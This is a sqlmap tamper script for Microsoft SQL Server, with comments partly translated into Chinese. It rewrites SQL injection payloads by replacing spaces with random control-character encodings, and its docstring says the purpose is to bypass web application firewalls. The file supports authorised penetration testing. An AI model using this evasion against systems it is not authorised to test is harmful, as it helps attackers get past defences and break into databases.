#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import random

from lib.core.common import singleTimeWarnMessage
from lib.core.compat import xrange
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage('篡改脚本“%s”仅适用于 %s' % (os.path.basename(__file__).split(".")[0], DBMS.MSSQL))

def tamper(payload, **kwargs):
    "\n    Replaces (MsSQL) instances of space character (' ') with a random blank character from a valid set of alternate characters\n\n    Requirement:\n        * 微软SQL服务器\n\n    测试针对：\n        * 微软 SQL Server 2000\n        * 微软 SQL Server 2005\n\n    Notes:\n        * 可用于绕过多个 Web 应用程序防火墙\n\n    >>> random.seed(0)\n    >>> tamper('SELECT id FROM users')\n    'SELECT%0Did%0DFROM%04users'\n    "

    # ASCII 表：
    # SOH 01 标题开始
    # STX 02 文本开头
    # ETX 03 文本结束
    # EOT 04 传输结束
    # ENQ 05 查询
    # ACK 06 确认
    # BEL 07 钟声
    # BS 08 退格键
    # TAB 09 水平制表符
    # LF 0A新线
    # VT 0B 垂直制表符
    # FF 0C 新页
    # CR 0D 回车
    # SO 0E 移出
    # SI 0F 移入
    blanks = ('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace, end = False, False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += random.choice(blanks)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                end = True

            elif payload[i] == " " and not doublequote and not quote:
                if end:
                    retVal += random.choice(blanks[:-1])
                else:
                    retVal += random.choice(blanks)

                continue

            retVal += payload[i]

    return retVal
